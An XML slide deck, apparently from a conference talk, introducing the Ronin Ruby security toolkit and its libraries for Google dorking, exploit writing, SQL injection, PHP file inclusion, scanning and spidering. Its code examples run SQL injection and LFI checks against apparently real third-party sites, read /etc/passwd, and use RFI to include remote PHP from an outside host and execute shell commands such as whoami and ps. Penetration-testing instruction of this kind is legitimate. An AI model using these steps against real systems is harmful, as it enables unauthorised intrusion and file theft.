<?xml version="1.0"?>
<!--
  ronin.rubyforge.org.

  Copyright (c) 2006-2009 Hal Brodigan (postmodern.mod3 at gmail.com)

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
-->

<slide-set>
  <slide>
    <title>Additional Libraries</title>

    <list>
      <item><a href="http://ronin.rubyforge.org/exploits/">ronin-exploits</a></item>
      <item><a href="http://ronin.rubyforge.org/dorks/">ronin-dorks</a></item>
      <item><a href="http://ronin.rubyforge.org/sql/">ronin-sql</a></item>
      <item><a href="http://ronin.rubyforge.org/php/">ronin-php</a></item>
      <item><a href="http://ronin.rubyforge.org/scanners/">ronin-scanners</a></item>
      <item><a href="http://ronin.rubyforge.org/web/">ronin-web</a></item>
    </list>
  </slide>

  <slide>
    <title>Ronin Dorks</title>

    <p>Supports various Google <tm /> Dorks:</p>

    <shell>$ sudo gem install ronin-dorks</shell>
    <shell>$ ronin-dorks
&gt;&gt;</shell>

    <notes>
      <p>
        The <a href="http://ronin.rubyforge.org/dorks/">Ronin Dorks</a>
        library provides support for various Google <tm /> Dorks. Google
        Dorking is the act of performing Search queries that yield you
        vulnerable web-sites or sensitive information. Ronin Dorks uses
        the <a href="http://gscraper.rubyforge.org/">GScraper</a> library.
      </p>
    </notes>
  </slide>

  <slide>
    <title>Ronin Dorks Examples</title>

    <code>Web::Dorks.inurl('stmt').first_page.urls</code>

    <code>Web::Dorks.index_of_cgi_bin.first_page.urls
Web::Dorks.php_my_admin.page(2).urls
Web::Dorks.sharepoint(:inurl => 'edu').first_page.urls</code>

    <notes>
      <p></p>
    </notes>
  </slide>

  <slide>
    <title>Ronin Exploits</title>

    <p>Provides exploitation and payload crafting functionality:</p>

    <shell>$ sudo gem install ronin-exploits</shell>

    <notes>
      <p>
        Ronin Exploits allow exploit developers to write exploits and
        payloads in Ruby.
      </p>
    </notes>
  </slide>

  <slide>
    <title>Ronin Exploit Example</title>

    <code>require 'ronin/exploits'

ronin_tcp_exploit do
  cache do
    self.name = 'trivial example'
    self.version = '0.2'
    self.license = License.cc_by_nc
    self.default_port = 1337
  end

  def build
    @buffer = 'some data'
  end

  def deploy
    tcp_connect_and_send @buffer
  end
end</code>

    <notes>
      <p>
        Using Ronin Exploits it becomes easy to define Exploits
        in Ruby, without having to write excess code.
      </p>
    </notes>
  </slide>

  <slide>
    <title>Ronin Payload Example</title>

    <code>require 'ronin/payalods'

ronin_shellcode do
end</code>
  </slide>

  <slide>
    <title>Ronin SQL</title>

    <p>Provides support for various SQL related tasks:</p>

    <shell>$ sudo gem install --no-rdoc ronin-sql</shell>
    <shell>$ ronin-sql
&gt;&gt;</shell>

    <notes>
      <p>
        <a href="http://ronin.rubyforge.org/sql/">Ronin SQL</a> provides
        support for various SQL related security tasks. The library
        currently supports scanning for SQL Injections and the crafting
        custom SQL Injection payloads.
      </p>
    </notes>
  </slide>

  <slide>
    <title>Ronin SQL Examples</title>

    <code>url = URI('http://redteatrosalternativos.com/_05enlaces/links/phpHoo3.php?viewCat=1')

url.has_sqli?
# =&gt; true

sqli = url.first_sqli
# =&gt; #&lt;Ronin::SQL::Injection: ...&gt;</code>
  </slide>

  <slide>
    <title>Ronin PHP</title>

    <p>Provides support for various PHP security tasks:</p>

    <shell>$ sudo gem install ronin-php</shell>
    <shell>$ ronin-php
&gt;&gt;</shell>

    <notes>
      <p>
        Ronin PHP provides support for various PHP related security task.
        The library currently supports Local File Inclusion (LFI) and
        Remote File Inclusion (RFI) detection, scanning and exploitation.
      </p>

      <p>
        Ronin PHP also comes with a custom RFI payload which uses PHP
        Remote Procedure Call (RPC) to execute arbitrary code or commands
        through the RFI. This payload also sports a cool Web 2.0 AJAX
        interface.
      </p>
    </notes>
  </slide>

  <slide>
    <title>Ronin PHP: LFI Example</title>

    <code>url = URI('http://www.e-builds.com/?page=Portfolio')

lfi = url.first_lfi
# =&gt; #&lt;Ronin::PHP::LFI: ...&gt;

lfi.get('/etc/passwd')
# =&gt; "..."

lfi.include('/etc/passwd')
# =&gt; #&lt;Ronin::PHP::LFI::File:/etc/passwd&gt;

lfi.include_target('lighttpd.conf')
# =&gt; #&lt;Ronin::PHP::LFI::File:/etc/lighttpd/lighttpd.conf&gt;</code>

    <notes>
      <p></p>
    </notes>
  </slide>

  <slide>
    <title>Ronin PHP: RFI Example</title>

    <code>url = URI('http://www.example.com/page.php?layout=default')

rfi = url.first_rfi
# =&gt; #&lt;Ronin::PHP::RFI: ...&gt;</code>

    <notes>
      <p></p>
    </notes>
  </slide>

  <slide>
    <title>Ronin PHP: RPC over RFI</title>

    <code>client = rfi.rpc

client.include('http://www.sketchy.com/my_functions.php')
# =&gt; true

client.fingerprint
# =&gt; {...}

client.call('shell.exec','whoami')
# =&gt; "www"</code>

    <notes>
      <p></p>
    </notes>
  </slide>

  <slide>
    <title>Ronin PHP: RPC Console Service</title>

    <code>php = client.console
php.phpversion
# =&gt; "4.3.10"

php.php_uname('-m')
# =&gt; "i686"</code>

    <notes>
      <p></p>
    </notes>
  </slide>

  <slide>
    <title>Ronin PHP: RPC Shell Service</title>


    <code>sh = client.shell
sh.cwd
# =&gt; "/var/www/site/\n"

sh.cd  '..'
# =&gt; ""

sh.exec('date -u')
# =&gt; "Thu Aug 21 10:29:38 UTC 2008\n"

sh.system('ps')
   PID TTY          TIME CMD
 27042 pts/8    00:00:00 bash
 27841 pts/8    00:00:00 ps
# =&gt; nil</code>

    <notes>
      <p></p>
    </notes>
  </slide>

  <slide>
    <title>Ronin Scanners</title>

    <p>
      Provides Ruby interfaces to various third-party security scanners:
    </p>

    <shell>$ sudo gem install ronin-scanners</shell>
    <shell>$ ronin-scanners
&gt;&gt;</shell>

    <notes>
      <p>
        Ronin Scanners provides Ruby interfaces to various third-party
        security scanners. It currently supports
        <a href="http://insecure.org/">Nmap</a> and all of it's
        command-line options. It also supports
        <a href="http://www.cirt.net/nikto2">Nikto</a>, the HTTP Server
        scanner.
      </p>
    </notes>
  </slide>

  <slide>
    <title>Ronin Scanners Example</title>

    <code>require 'ronin/scanners/nmap'

Scanners::Nmap.scan(
  :targets => 'www.google.com',
  :ports => [80, 21, 25],
  :service_scan => true
)
# => nil</code>

    <code>Scanners::Nmap.import_scan(
  :targets => 'www.google.com',
  :ports => [80, 21, 25],
  :service_scan => true
)
# => [...]
</code>

    <notes>
      <p>
        Typing Ruby, while your already in Ruby, is easier than remembering
        Nmap's command-line options.
      </p>
    </notes>
  </slide>

  <slide>
    <title>Ronin Web</title>

    <p>Provides web-scraping and spidering functionality for Ronin:</p>

    <shell>$ sudo gem install ronin-web</shell>
    <shell>$ ronin-web
&gt;&gt;</shell>

    <notes>
      <p></p>
    </notes>
  </slide>

  <slide>
    <title>Ronin Web Example</title>

    <code>page = Web.get('http://reddit.com/')
puts page.search('a.title/@href')</code>

    <code>agent = Web::Spider.host('example.com') do |s|
  s.every_url { |url| ... }
  s.every_page { |page| ... }
end</code>

    <notes>
      <p></p>
    </notes>
  </slide>
</slide-set>
